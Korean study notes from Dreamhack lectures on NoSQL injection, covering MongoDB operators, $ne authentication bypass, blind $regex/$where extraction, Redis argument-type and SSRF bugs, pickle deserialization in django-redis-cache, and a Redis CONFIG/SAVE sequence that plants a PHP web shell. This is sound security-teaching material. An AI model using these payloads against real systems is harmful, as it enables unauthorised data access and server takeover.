# Web Hacking: Server-side Advanced - NoSQL
🔖 출처
* [Dreamhack Lecture] Server-side Advanced - NoSQL [🔗](https://dreamhack.io/lecture/courses/29)
* [Dreamhack Web Hacking] Background: Non-Relational DBMS [🔗](https://dreamhack.io/lecture/courses/168)
* [Dreamhack Web Hacking] ServerSide: NoSQL Injectoin [🔗](https://dreamhack.io/lecture/courses/189)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: MongoDB DBMS [🔗](https://dreamhack.io/lecture/courses/285)
* [Dreamhack Web Hacking Advanced - Server Side] Exploit Tech: Redis DBMS [🔗](https://dreamhack.io/lecture/courses/284)

<br/><br/>

## Overview: NoSQL
* Background: **NoSQL** = Non-Realtional DBMS(NRDBMS, 비관계형 데이터베이스)
    - NoSQL의 의미에 대해 NonSQL, Non relational SQL, Not Only SQL 등 다양한 의미가 존재함 → 현재는 Not Only SQL로 많이 사용되고 있음
        + **Not Only SQL**: *"데이터를 다루기 위해 꼭 SQL을 사용하지 않아도 데이터를 다룰 수 있다"는 의미*
    - **키-값**(Key-Value)를 사용해 데이터를 저장함
    - 데이터를 조회/추가/삭제하기 위해 SQL을 사용하지 않음 <br/> &nbsp;&nbsp; → 📌 RDBMS와는 달리 **복잡하지 않는 데이터를 다룬다는 것**이 가장 큰 특징임
        + NoSQL 데이터베이스는 단순 검색 및 추가 작업을 위한 매우 최적화된 저장 공간임
        + 다루는 데이터의 구조와 특징에 따라 여러 종류를 구분할 수 있음 [🔗](https://en.wikipedia.org/wiki/NoSQL#Types_and_examples) <br/> &nbsp;&nbsp; → Redis, Dynamo, CouchDB, MongoDB 등 다양한 DBMS별로 구조와 사용 문법을 배워야 함

<br/>
    
* NoSQL Injection
    - NoSQL 데이터베이스(NRDBMS) 또한 RDBMS와 같이 회원 계정, 비밀글 등과 같은 민감한 정보가 포함되어 있을 수 있음
        + ⚠️ 공격자는 데이터베이스 파일 탈취, NoSQL Injection 공격 등으로 민감한 정보를 확보하고 금전적인 이득을 취할 수 있음 <br/> &nbsp;&nbsp; → **임의 정보 소유자 이외의 이용자에게 민감한 정보가 노출되지 않도록 해야 함**
    - SQL Injection과 NoSQL Injection의 비교
        | | 설명 |
        |:---:|------|
        | 유사점 | 공격 목적 및 방법이 매우 유사함 <br/> &nbsp;&nbsp; - 이용자의 입력값이 쿼리에 포함되면서 발생하는 문제점 <br/> &nbsp;&nbsp; - 주로 **이용자의 입력값에 대한 검증이 불충분**할 때 발생함 |
        | 차이점 | - SQL Injection의 경우 SQL을 이해하고 있다면 모든 RDBMS에 대한 공격 수행이 가능함 <br/> - NoSQL Injection은 사용하는 DBMS에 따라 요청 방식과 구조가 다름 → 각각의 NRDBMS에 대해 이해하고 있어야 함 |

<br/><br/><br/>

## MongoDB
* Background: MongoDB
    - **key-value**의 쌍을 가지는 JSON objects 형태인 도큐먼트(Document)를 저장함
    - MongoDB의 특징
        + Schema가 존재하지 않아 각 콜렉션에 대한 특별한 정의를 하지 않아도 됨
            - MongoDBd에서는 SQL의 테이블과 유사한 개념으로 콜렉션(Collection)을 사용함
        + JSON 형식으로 쿼리를 작성할 수 있음
        + ```_id``` 필드가 Primary Key 역할을 함
    - MongoDB의 Query Operator [🔗](https://www.mongodb.com/docs/manual/reference/operator/query/) <br/> &nbsp;&nbsp; ↳ MongoDB는 **```$``` 문자**를 통해 연산자를 사용할 수 있음
        + Comparison
            | Operator | 설명 |
            |:---:|------|
            | ```$eq``` | 지정된 값과 같은 값을 찾음 (equal) |
            | ```$gt``` | 지정된 값보다 큰 값을 찾음 (greater than) |
            | ```$gte``` | 지정된 값보다 크거나 같은 값을 찾음 (greater than equal) |
            | ```$in``` | 배열 안의 값들과 일치하는 값을 찾음 (in) |
            | ```$lt``` | 지정된 값보다 작은 값을 찾음 (less than) |
            | ```$lte``` | 지정된 값보다 작거나 같은 값을 찾음 (less than equal) |
            | ```$ne``` | 지정된 값과 같지 않은 값을 찾음 (not equal) |
            | ```$nin``` | 배열 안의 값들과 일치하지 않은 값을 찾음 (not in) |
        + Logical
            | Operator | 설명 |
            |:---:|------|
            | ```$and``` | 논리적 AND → 각각의 쿼리를 모두 만족하는 문서가 반환됨 |
            | ```$or``` | 논리적 OR → 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됨 |
            | ```$not``` | 쿼리 식의 효과를 반전시킴 → 쿼리 식과 일치하지 않은 문서를 반환함 |
            | ```$nor``` | 논리적 NOR → 각각의 쿼리를 모두 만족하지 않는 문서가 반환됨 |
        + Element
            | Operator | 설명 |
            |:---:|------|
            | ```$exists``` | 지정된 필드가 있는 문서를 찾음 |
            | ```$type``` | 지정된 필드가 지정된 유형인 문서를 선택함 |
        + Evaluation
            | Operator | 설명 |
            |:---:|------|
            | ```$expr``` | 쿼리 언어 내에서 집계식을 사용할 수 있음 |
            | ```$jsonSchema``` | 주어진 JSON 스키마에 대해서 문서를 검증함 |
            | ```$mod``` | 필드 값에 대해 mod 연산을 수행하고 지정된 결과를 가진 문서를 선택함 |
            | ```$regex``` | 지정된 정규식과 일치하는 문서를 선택함 |
            | ```$text``` | 지정된 텍스트를 검색함 |
            | ```$where``` | 지정된 Javascript 식을 만족하는 문서와 일치함 |
    - MongoDB의 문법
        + **데이터 조회**: ```db.collection.find()``` [🔗](https://www.mongodb.com/docs/manual/reference/method/db.collection.find/#std-label-find-projection)
            ```mongodb
            db.collection.find(query, projection, options)
            ```
            | Parameter | Type | Description |
            |:---:|---|------|
            | ```query``` | document | (Optional) 연산자를 사용하여 선택 필터를 지정함 <br/> &nbsp;&nbsp; - 모든 문서를 반환시키기 위해서는 매개변수 생략 또는, 빈 문서(```{}```)를 전달함 |
            | ```projection``` | document | (Optioanl) ```query```와 알치하는 문서에서 반환할 필드를 지정함 <br/> &nbsp;&nbsp; - 생략 시에는 일치하는 문서의 모든 필드를 반환함 |
            | ```options``` | document | (Optional) ```query```에 대해 추가 옵션을 지정함 <br/> &nbsp;&nbsp; - 쿼리 동작과 결과가 반환되는 방식을 수정함 |
            - SQL의 ```SELECT``` 문에 해당함
                | | 예시 및 설명 |
                |:---:|------|
                | SQL | ```SELECT * FROM account``` <br/> → account 테이블 전체 조회 <br/><br/> ```SELECT * FROM account WHERE user_id="admin";``` <br/> → account 테이블에서 user_id가 "admin"인 데이터를 조회함 <br/><br/> ```SELECT user_idx FROM account WHERE user_id="admin";``` <br/> → account 테이블에서 user_id가 "admin"인 행에서 user_idx 열에 해당하는 데이터를 조회함 |
                | MongoDB | ```db.account.find()``` <br/> → account 셀력센을 검색함 <br/><br/> ```db.account.find({user_id: "admin"})``` <br/> → account 셀렉션에서 user_id(key)가 "admin"인 데이터를 검색함 <br/><br/> ```db.account.find({user_id: "admin"}, {user_idx: 1, _id: 0})``` <br/> → account 셀렉션에서 user_id가 "admin"인 데이터의 user_idx 정보를 조회함 <br/> &nbsp;&nbsp; (```user_idx: 1```은 포함한다는 의미이고, ```_id:0```은 제외한다는 의미임) |
        + **데이터 삽입**: ```db.collection.insert()``` [🔗](https://www.mongodb.com/docs/manual/reference/method/db.collection.insert/)
            ```mongodb
            db.collection.insert(
                    <documnet or array of documents>,
                    {
                        writeConcern: <document>,
                        orderer: <boolean>
                    }
            )
            ```
            | Parameter | Type | Description |
            |:---:|---|------|
            | ```document``` | document/array | 컬렉션에 삽입할 문서 또는 문서 배열 |
            | ```writeConcern``` | document | (Optional) 기본으로 설정 시 생략 가능 → [🔗](https://www.mongodb.com/docs/manual/reference/method/db.collection.insert/#std-label-insert-wc) Write Concern 참고 |
            | ```ordered``` | boolean | (Optional) true일 경우 순서대로 삽입하고, false일 경우 정렬하지 않고 삽입을 수행함 |
            - SQL의 ```INSERT``` 문에 해당함
                | | 예시 및 설명 |
                |:---:|------|
                | SQL | ```INSERT INTO account(user_id, user_pw) VALUES ("guest", "guest");``` <br/> → account 테이블의 user_id(첫 번째 열)에 "guest"(첫 번째 값)을, user_pw(두 번째 열)에 "guest"(두 번째 값)을 삽입함 |
                | MongoDB | ```db.account.insert({user_id: "guest"}, {user_pw: "guest"})``` <br/> → account 셀렉션의 user_id(key)에 "guest"(value)를, user_pw(key)에 "guest"(value)를 삽입함 |
        + **데이터 삭제**: ```db.collection.remove()``` [🔗](https://www.mongodb.com/docs/manual/reference/method/db.collection.remove/)
            ```mongodb
            db.collection.remove(
                <query>,
                <justOne>
            )
            ```
            | Parameter | Type | Description |
            |:---:|---|------|
            | ```query``` | document | 연산자를 사용하여 삭제 기준을 지정함 <br/> &nbsp;&nbsp; - 모든 문서를 삭제하려면 빈 문서(```{}```)를 전달함 |
            | ```justOne``` | boolean | (Optional) 삭제를 하나의 문서로 제한하려면 true, 일치하는 모든 문서를 삭제하려면 false |
            - SQL의 ```DELETE``` 문에 해당함
                | | 예시 및 설명 |
                |:---:|------|
                | SQL | ```DELETE FROM account;``` <br/> → account 테이블에서 데이터 전체를 삭제함 <br/><br/> ```DELETE FROM account WHERE user_id="guest";``` <br/> → account 테이블에서 user_id가 "guest"인 데이터를 삭제함 |
                | MongoDB | ```db.account.remove()``` <br/> → account 셀렉션 내의 모든 키-값을 삭제함 <br/><br/> ```db.account.remove({user_id: "guest"})``` <br/> → account 셀렉션에서 user_id(key)가 "guest"(value)인 데이터를 삭제함 |
        + **데이터 수정**: ```db.collection.update()``` [🔗](https://www.mongodb.com/docs/manual/reference/method/db.collection.update/)
            ```mongodb
            db.collection.update(query, update, options)
            ```
            | Parameter | Type | Description |
            |:---:|---|------|
            | ```query``` | document | 업데이트 선택 기준 |
            | ```update``` | document/pipeline | 연산식, 대체 문서, 파이프라인 등을 이용해 적용할 수정 사항을 지정함 |
            | ```options``` | document | (Optional) ```query```에 대한 추가 옵션을 지정함 <br/> &nbsp;&nbsp; - 쿼리 동작과 결과가 반환되는 방식을 수정함 |
            - SQL의 ```UPDATE``` 문에 해당함
                | | 예시 및 설명 |
                |:---:|------|
                | SQL | ```UPDATE account SET user_id="guest2" WHERE user_idx=2;``` <br/> → account 테이블에서 user_idx가 2인 데이터의 user_id를 "guest2"로 변경함 |
                | MongoDB | ```db.account.update({user_idx: 2}, {$set: {user_id: "guest2"}})``` <br/> → account 셀렉션에서 user_idx가 2인 데이터의 user_id를 "guest2"로 설정(```$set```)하고 변경사항을 저장함 |

<br/><br/>

### MongoDB Injection
* ⚠️ ***주로 사용자 입력 데이터에 대한 타입 검증이 충분하지 않아 발생함***
    - MongoDB에서는 문자열, 정수, 날짜, 실수 외에도 오브젝트, 배열 타입을 저장하는 데이터의 자료형으로 사용할 수 있음 <br/> &nbsp;&nbsp; → **오브젝트 타입의 입력값**을 처리할 때에는 쿼리 연산자를 사용할 수 있음 → 이를 통해 의도하지 않은 행위를 수행할 수 있음
    - ⚠️ GET과 POST 메소드 방식 모두 **이용자의 입력값에 대한 타입을 검사하지 않으면** 다양한 형태의 데이터를 전달할 수 있음 <br/> &nbsp;&nbsp; → 입력값을 이용해 특정 기능을 수행할 수 있는 경우 악의적인 행위를 수행할 수 있음
        | 메소드 | 설명 |
        |:---:|------|
        | **GET** | 이용자의 입력 데이터의 타입이 문자열로 고정되어 있지 않으면 문자열 타입 외의 데이터 타입이 입력될 수 있음 <br/> &nbsp;&nbsp; → 오브젝트(객체) 타입의 값을 삽입하여 실행시킬 수 있음 |
        | **POST** | Post의 body에 JSON 형식으로 데이터를 전달하면 데이터의 타입이 문자열로 고정되어 있지 않아 문자열 타입 외의 데이터 타입이 입력될 수 있음 <br/> &nbsp;&nbsp; → 오브젝트(객체) 타입의 입력값을 전달할 수 있음 (POST 방식으로 입력값을 전달하는 함수를 작성하고 이를 통해 입력값을 전달함) |

<br/>

* 예제: user 콜렉션에서 이용자가 입력한 ```uid```, ```upw```에 해당하는 데이터를 찾고 출력하는 경우
    ```javascript
    const express = require('express');
    const app = express();

    const mongoose = require('mongoose');
    const db = mongoose.connection;
    mongoose.connect('mongodb://localhost:27017/', {useNewUrlParser: true, useUnifiedTopology: true});

    // GET 메소드 방식을 사용함
    app.get('/query', function(req, res) {
        db.collection('user').find({ // db의 user 컬렉션에서 uid, upw가 이용자의 입력값과 동일한 데이터를 검색함
            'uid': req.query.uid,
            'upw': req.query.upw // 이용자의 입력값인 req.query.uid, req.query.upw를 '어떠한 검사'도 없이 그대로 사용하고 있음 → 객체 타입의 데이터를 전달할 수 있음
        }).toArray(function(err, result) {
            if (err) throw err;
            res.send(result);
        });
    });

    const server = app.listen(3000, function() {
        console.log('app.listen');
    })
    ```
    - ⚠️ ```db.collection.find()``` 함수를 이용하여 user 콜렉션의 데이터를 조회할 때 **이용자의 입력값에 대한 타입 검증을 수행하지 않아 오브젝트 타입의 값을 입력할 수 있음** <br/> &nbsp;&nbsp; → 이를 이용하면 uid 또는 upw를 모르는 상황에서도 user 콜렉션의 데이터를 조회할 수 있음
    - ```$ne``` 연산자(not equal)를 이용하여 user 콜렉션의 정보를 획득하는 방법
        | | 설명 |
        |:---:|------|
        | URL(GET) | ```http://localhost/query?uid=admin&upw[$ne]=a``` <br/> → GET 방식으로 요청 시 upw에 지정된 값과 같지 않는 값을 찾는 ```$ne``` 연산자를 삽입함 |
        | 함수 | ```db.collection('user').find({'uid': 'admin', 'upw': {'$ne': 'a'}})``` <br/> → uid가 'admin'이고, upw가 'a'가 아닌 값을 user 콜렉션에서 조회함 ⇒ upw의 값에 상관 없이 uid가 'admin'인 계정을 조회할 수 있음 |
    - 📌 동일한 코드를 GET이 아닌 POST 메소드 방식으로 요청하는 경우
        ```javascript
        // 위의 예제 코드에서 app.get() 함수 부분을 대신 아래의 app.post() 함수를 사용할 경우 (POST 메소드 방식을 사용함)
        app.post('/query', function(req, res) {
            db.collection('user').find({
                'uid': req.body.uid,
                'upw': req.body.upw // req.body.uid, req.body.upw를 '어떠한 검사도 없이' 그대로 사용하고 있음 → JSON 형식으로 객체 타입의 데이터를 전달할 수 있음
            }).toArray(function(err, result) {
                if (err) throw err;
                res.send(result);
            });
        });
        ```
        + ```$ne``` 연산자(not equal)를 이용하여 uid 또는 upw를 모르는 상황에서도 원하는 데이터를 조회할 수 있음
            | | 설명 |
            |:---:|------|
            | POST Data | ```{'uid': 'admin', 'upw': {'$ne':''}}``` <br/> → JSON 형식의데이터에서 upw에 지정된 값과 같지 않는 값을 찾는 ```$ne``` 연산자를 삽입한 후 이를 POST의 body로 하여 요청을 전송함 |
            | 함수 | ```db.collection('user').find({'uid': 'admin', 'upw': {'$ne': ''}})``` <br/> → uid가 'admin'이고, upw가 ''가 아닌 값을 user 콜렉션에서 조회함 ⇒ upw의 값에 상관 없이 uid가 'admin'인 계정을 조회할 수 있음 |

<br/><br/>

### MongoDB Blind Injection
* 추출하기 위한 데이터를 직접적으로 확인할 수 없는 상황에서 사용할 수 있음 <br/> &nbsp;&nbsp; → **```$regex```, ```$where``` 연산자**를 사용해 Blind Injection을 수행할 수 있음
    - ```$regex``` 연산자를 사용하는 방법
        + ```$regex``` 연산자는 **정규식을 사용해 식과 일치하는 데이터를 조회**함
            | 정규식 표현 | 설명 |
            |:---:|------|
            | ```^``` | 입력의 시작 부분을 나타냄 <br/> &nbsp;&nbsp; → ```^a```, ```^ab```와 같이 각 위치에 맞는 알파벳을 찾으면 다음 위치에서 다시 하나의 일파벳을 조회하여 비밀번호를 알아낼 <br/> &nbsp;&nbsp;&nbsp;&nbsp; 수 있음 |
            | ```.{숫자}``` | ```.```은 모든 문자 하나와 일치하고, ```{...}```은 반복을 나타냄 <br/> &nbsp;&nbsp; → 중괄호 안의 숫자를 변경시켜가며 비밀번호의 길이를 획득할 수 있음 |
            - 예시: user 컬렉션의 ```upw```에서 각 문자로 시작하는 데이터(```{$regex: "^알파벳"}```)를 조회함
                ```mongodb
                db.user.find({upw: {$regex: "^a"}}) → upw의 첫 번째 글자가 a인 데이터를 조회함 (F)
                db.user.find({upw: {$regex: "^b"}}) → upw의 첫 번째 글자가 b인 데이터를 조회함 (F)
                ...
                db.user.find({upw: {$regex: "^g"}}) → upw의 첫 번째 글자가 g인 데이터를 조회함 (T)
                ```
    - ```$where``` 연산자를 사용하는 방법
        + ```$where``` 연산자는 **인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회**함
            - ```substring``` 함수를 이용
                | 함수 | 설명 |
                |:---:|------|
                | ```substring(start, end)``` | ```start```에서 ```end```까지 문자열을 잘라 해당 문자열을 반환함 (```end-1```까지 문자열을 자름) <br/> &nbsp;&nbsp; → ```start```의 값을 변경하여 한 글자씩 데이터를 알아낼 수 있음 |
                + 예시: user 컬렉션의 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교해 데이터를 추출할 수 있음
                    ```mongodb
                    db.user.find({$where: "this.upw.substring(0, 1) == 'a'"}) → upw의 첫 번째 글자가 a인 데이터를 조회함 (F)
                    db.user.find({$where: "this.upw.substring(0, 1) == 'b'"}) → upw의 첫 번째 글자가 b인 데이터를 조회함 (F)
                    ...
                    db.user.find({$where: "this.upw.substring(0, 1) == 'g'"}) → upw의 첫 번째 글자가 g인 데이터를 조회함 (T)
                    ```
            - Time based: ```sleep``` 함수 이용
                + Javascript 표현식과 ```sleep(sec)``` 함수를 ```&&```(논리 AND)로 연결하면 표현식을 만족할 경우 시간 지연이 발생함
                + 예시: user 컬렉션에서 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교하여 참일 경우에 시간 지연이 발생함
                    ```mongodb
                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='a'&&sleep(5000)"})
                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='b'&&sleep(5000)"})
                    ...
                    db.user.find({$where: "this.uid=guest&&this.upw.substring(0, 1)=='g'&&sleep(5000)"}) → 결과가 참이므로 시간 지연 발생
                    ```
            - Error based
                + Javascript 표현식과 올바르지 않은 문법으로 구성된 데이터를 ```&&```(논리 AND)로 연결하면 표현식을 만족할 경우 에러가 발생됨
                + 예시: user 컬렉션에서 ```upw```의 첫 번째 글자(```upw.substring(0, 1)```)를 비교하여 참일 경우에 에러가 발생함
                    ```mongodb
                    db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
                    // → error: { "$err": "ReferenceError: asdf is not defined near '&&this.upw== '$upw'' "}, code: 16722
                    //    (this.upw.substring(0, 1) == 'g'가 참이기 때문에 asdf 코드가 실행되어 해당 부분에서 에러 발생)

                    db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
                    //     (this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음)
                    ```

<br/><br/><br/>

## Redis
* Background: Redis
    - **key-value** 데이터 모델을 가지며, **메모리 기반으로 작동**하는 NoSQL DBMS
        + 메모리를 사용해 데이터를 저장하고 접근하기 때문에 Read/Write 속도가 다른 DBMS보다 빠름 <br/> → 다양한 서비스에서 임시 데이터를 캐싱하는 용도로 많이 사용됨
    - Redis의 Commands [🔗](https://redis.io/commands/)
        + 데이터 조회/조작 명령어
            | Command | Syntax | Description |
            |:---:|----|------|
            | GET | ```GET key``` | 데이터 조회 [🔗](https://redis.io/commands/get/) <br/> &nbsp;&nbsp; - key의 값을 가져옴 (키가 없는 경우 ```nil```이 반환됨) |
            | MGET | ```MGET key [key ...]``` | 여러 데이터를 조회 [🔗](https://redis.io/commands/mget/) <br/> &nbsp;&nbsp; - 지정된 모든 key의 값을 반환함 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(문자열 값을 보유하지 않거나 존재하지 않는 모든 키 값에 대해 ```nil```이 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 반환됨) |
            | SET | ```SET key value``` | 새로운 데이터 추가 [🔗](https://redis.io/commands/set/) <br/> &nbsp;&nbsp; - 키에 이미 값이 있을 경우 덮어씀 |
            | MSET | ```MSET key value [key value ...]``` | 여러 데이터를 추가 [🔗](https://redis.io/commands/mset/) <br/> &nbsp;&nbsp; - 주어진 키를 각각의 값으로 설정함 (기존 값이 존재하면 새 값으로 덮어씀) |
            | DEL | ```DEL key [key ...]``` | 데이터 삭제 [🔗](https://redis.io/commands/del/) <br/> &nbsp;&nbsp; - 지정된 키를 제거함 |
            | EXISTS | ```EXISTS key [key ...]``` | 데이터 유무 확인 [🔗](https://redis.io/commands/exists/) <br/> &nbsp;&nbsp; - 키가 존재하면 반환함 |
            | INCR | ```INCR key``` | [64 bit signed integer] 데이터 값에 1을 더함 [🔗](https://redis.io/commands/incr/) <br/> &nbsp;&nbsp; - 키에 저장된 숫자를 1씩 증가시킴 (키가 없으면 해당 작업 수행 전에 0으로 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 설정됨) |
            | DECR | ```DECR key``` | [64 bit signed integer] 데이터 값에 1을 뺌 [🔗](https://redis.io/commands/decr/) <br/> &nbsp;&nbsp; - 키에 저장된 숫자를 1씩 감소시킴 (키가 없으면 해당 작업 수행 전에 0으로 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 설정됨) |
        + 관리 명령어
            | Command | Syntax | Description |
            |:---:|----|------|
            | INFO | ```INFO [section]``` | DBMS 정보 조회 [🔗](https://redis.io/commands/info/) <br/> &nbsp;&nbsp; - 서버에 대한 정보와 통계를 컴퓨터가 분석하기 쉽고 사람이 읽기 쉬운 형식으로 <br/> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 반환함 (자세한 옵션은 공식 문서 참고) |
            | CONFIG GET | ```CONFIG GET parameter``` | 설정 조회 [🔗](https://redis.io/commands/config-get/) <br/> &nbsp;&nbsp; - 실행 중인 Redis 서버의 구성 매개변수를 읽는 데 사용함 |
            | CONFIG SET | ```CONFIG SET parameter value``` | 새로운 설정을 입력 [🔗](https://redis.io/commands/config-set/) <br/> &nbsp;&nbsp; - 재시작 필요 없이 런타임에 서버를 재구성하기 위해 사용함 |

<br/><br/>

### Bug Case: Redis를 사용하는 서비스에서 의도하지 않는 명령어를 실행할 수 있는 버그가 발생할 수 있는 상황
* NodeJS redis 모듈 (처리방식을 이용한 공격)
    ```javascript
    // NodeJS에서 Redis를 사용하는 코드
    var express = require('express');
    var app = express();
    app.use(express.json());
    app.use(express.urlencoded( {extended: false}) );
    
    const redis = require('redis');
    const client = redis.createClient();

    app.get('/init', function(req, res) {
        // client.set("key", "value");
        client.set(req.query.uid, JSON.stringify({level: 'guest'})); // 이용자가 입력하는 uid(req.query.uid) 값을 key로 하여 {level: 'guest'} 값을 value로 저장함
        res.send('ok');
    });

    var server = app.listen(3000, function() {
        console.log('app.listen');
    })
    ```
    - ```req.query```에 해당하는 부분에 문자열 타입 외에도 배열(array), 객체(object) 타입도 넣을 수 있음
        + command의 첫 번째 인자에 해당하는 ```req.query.uid```에 해당하는 이용자의 입력값의 타입 별 처리 방식
            | 타입 | 처리 방식 |
            |:---:|------|
            | 문자열 <br/> (String) | (입력) key, value, callback <br/> &nbsp;&nbsp; ⇒ ```new Command(command, [key, value], callback)``` |
            | 배열 <br/> (Array) | (입력) [key, value] <br/> &nbsp;&nbsp; ⇒ ```new Command(command, key, value)``` <br/> &nbsp;&nbsp;&nbsp;&nbsp; (```len == 2```일 경우 callback을 배열의 두 번째 값으로 설정하기 때문) |
            - Redis의 command 라이브러리 일부
                ```javascript
                // https://github.com/NodeRedis/node-redis/blob/0041e3e53d5292b13d96ce076653c5b91b314fda/lib/commands.js → Line 20 - 25, 46
                if (Array.isArray(arguments[0])) { // command의 첫 번째 인자에 array 타입이 올 경우 실행됨
                    arr = arguments[0];
                    if (len == 2) {
                        callback = arguments[1];
                    }
                }

                // ...

                return this.internal_send_command(new Command(command, arr, callback));
                ```
    - ⚠️ *배열 타입으로 값을 입력할 경우 개발 시 의도한 value로 값이 설정되지 않고 임의의 값을 value로 사용할 수 있음*
        + 공격자가 ```http://localhost:3000/init?uid[]=test&uid[]={"level": "admin"}```와 같이 입력함 <br/> &nbsp;&nbsp; → Redis에 요청하는 명령어로 ```Command("set", "test", '{"level": "admin"}')```가 실행되어 원하는 value를 가지는 데이터를 생성할 수 있음

<br/>

* SSRF(Server-Side Request Forgery)
    - Redis는 **기본적으로 인증 수단이 존재하지 않으며 bind 127.0.0.1로 서비스되기 때문**에 직접 접근하여 인증 과정 없이 명령어를 실행할 수 있음 <br/> &nbsp;&nbsp; → ⚠️ 공격자는 SSRF 취약점을 통해 Redis 서버에 접근하여 명령어를 실행시키거나 데이터베이스의 정보를 획득할 수 있음
    - SSRF 공격 기법
        + 유효하지 않은 명령어 삽입
            - 이전 명령어로 유효하지 않은 명령어가 입력되어도 연결이 끊어지지 않고 다음 유효한 명령어를 처리함 <br/> &nbsp;&nbsp; → 유효하지 않은 명령어 뒤에 임의의 명령어를 삽입하여 Redis에서 실행시킴
        + HTTP 프로토콜 이용
            - HTTP의 Body 부분에 원하는 명령어를 포함시켜 요청을 전송함 → 애플리케이션에서 Redis 명령어가 포함된 Body 데이터를 처리할 때 해당 명령어를 Redis에서 실행함
                + 예시: Body에 포함된 ```SET key value``` 명령어를 Redis에서 실행시킴
                    ```
                    POST / HTTP/1.1
                    host: 127.0.0.1:6379
                    user-agent: Mozilla/5.0...
                    content-type: application/x-www-form-urlencoded

                    data=a
                    SET key value
                    ```
            - 💡 HTTP 프로토콜을 이용한 SSRF 방어 방법 → **HTTP의 주요 키워드가 명령어로 입력되면 해당 연결을 끊어버리는 방식**을 사용함 [🔗](https://github.com/redis/redis/commit/a81a92ca2ceba364f4bb51efde9284d939e7ff47)
                + 예시
                    ```linux
                    $ echo -e "post a\r\nget hello" | nc 127.0.0.1 6379
                    $ echo -e "host: a\r\nget hello" | nc 127.0.0.1 6379

                    # 12235:M 01 May 09:59:57.614 # Possible SECURITY ATTACK detected. It looks like somebody is sending POST or Host: commands to Redis. This is likely due to an attacker attempting to use Cross Protocol Scripting to compromise your Redis instance. Connection aborted.
                    ```
                    - *```post``` 또는 ```host``` 키워드가 포함될 경우 securityWarningCommand로 인식하여 클라이언트와의 연결을 끊어버려 다음 명령어가 실행되지 않도록 패치됨*
                + ⚠️ HTTP 프로토콜을 제외한 다른 프로토콜을 이용한 공격 방법에는 취약할 수 밖에 없음

<br/><br/>

### Exploit Technique: Redis를 통해 공격할 수 있는 방법들
* django-redis-cache
    - Python의 웹 프레임워크 Django에서 Redis를 사용한 캐시(cache)를 구현할 수 있는 모듈
        + django-redis-cache 모듈의 ```get_serializer_class``` 함수
            ```python
            # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/backends/base.py → Line 132-137
            def get_serializer_class(self):
                # serializer_class를 가져올 때 options의 SERIALIZER_CLASS의 값을 가져옴 (해당 값이 없을 경우에는 redis_cache.serializers.PickleSerializer를 기본값으로 사용함)
                serializer_class = self.options.get(
                    'SERIALIZER_CLASS',
                    'redis_cache.serializers.PickleSerializer' # PickleSerializer 클래스는 아래쪽을 참고
                )
                return import_class(serializer_class)

            # https://github.com/sebleier/django-redis-cache/blob/cabfcb24476e562fa7275f77bc55f835d125e26c/redis_cache/serializers.py → Line 33-42
            class PickleSerializer(object):
                # django-redis-cache 모듈의 기본 Serializer = PickleSerializer
                def __init__(self, pickle_version=-1):
                    self.pickle_version = pickle_version

                def serialize(self, value):
                    return pickle.dumps(value, self.pickle_version)

                def deserialize(self, value):
                    return pickle.loads(force_bytes(value))
            ```
            - ⚠️ django-redis-cache의 기본 Serializer인 ```PickleSerializer```에서 Python의 pickle 모듈을 사용하여 serialize를 수행하고 있음 <br/> &nbsp;&nbsp; → ***Redis에서 원하는 데이터를 저장한 후 해당 데이터가 deserialize하게 되는 과정에서 pickle 모듈을 이용하여 공격을 수행할 수 있음***
    - django-redis-cache 모듈 예시
        ```python
        # settings.py
        CACHES = {
            "default": {
                "BACKEND": "django-redis.cache.RedisCache",
                "LOCATION": "redis://127.0.0.1:6379/"
            }
        }

        # views.py
        from django.http import HttpResponse
        from .models import Memo
        from django.core.cache import cache

        def p_set(request):
            # p_set 함수 실행 시 cache.set 함수를 사용해 cache_memo라는 키를 생성함 (redis에서 key * 명령어로 생성된 키 확인 가능)
            # 
            cache.set('cache_memo', Memo('memo test!!'))
            return HttpResponse('set session')
        ```
        + ```p_set``` 함수 실행 시 ```cache.set``` 함수를 사용해 cache_memo라는 키를 생성함 (redis에서 ```key *```를 입력하여 생성된 키를 확인할 수 있음) <br/> &nbsp;&nbsp; → ```get ':1:cache_memo```로 cache_memo의 값을 확인해보면 Pickle로 dump된 값을 확인할 수 있음

<br/>

* Redis 명령어를 이용한 공격
    - **```SAVE```**: 메모리의 데이터를 파일 시스템에 저장할 때 사용하는 명령어 [🔗](https://redis.io/commands/save/)
        | command | syntax | description |
        |:---:|---|------|
        | SAVE | ```SAVE``` | RDB 파일 형식으로 Redis 인스턴스 내부의 모든 데이터에 대한 특정 시점의 스냅샷을 생성하는 데이터 세트의 동기시적 저장(synchronous save)를 수행함 → 명령 성공 시 OK를 반환함 <br/> &nbsp;&nbsp; - 메모리의 데이터를 저장하는 파일의 저장 주기를 지정하거나 즉시 저장할 수 있음 <br/> &nbsp;&nbsp; - 저장되는 파일의 경로와 이름, 그리고 저장할 데이터를 함께 설정할 수 있음 |
        + ⚠️ **```SAVE``` 명령어를 통해 Redis의 쓰기 권한이 있는 경로에 원하는 파일을 생성한 후 PHP 등의 다른 어플리케이션과 연계하여 공격을 수행할 수 있음**
            - 공격 예시: ```SAVE``` 명령어를 이용한 WebShell 삽입
                ```redis
                CONFIG set dir /tmp
                CONFIG set dbfilename redis.php
                SET test "<?php system($_GET['cmd']); ?>"
                SAVE
                ```
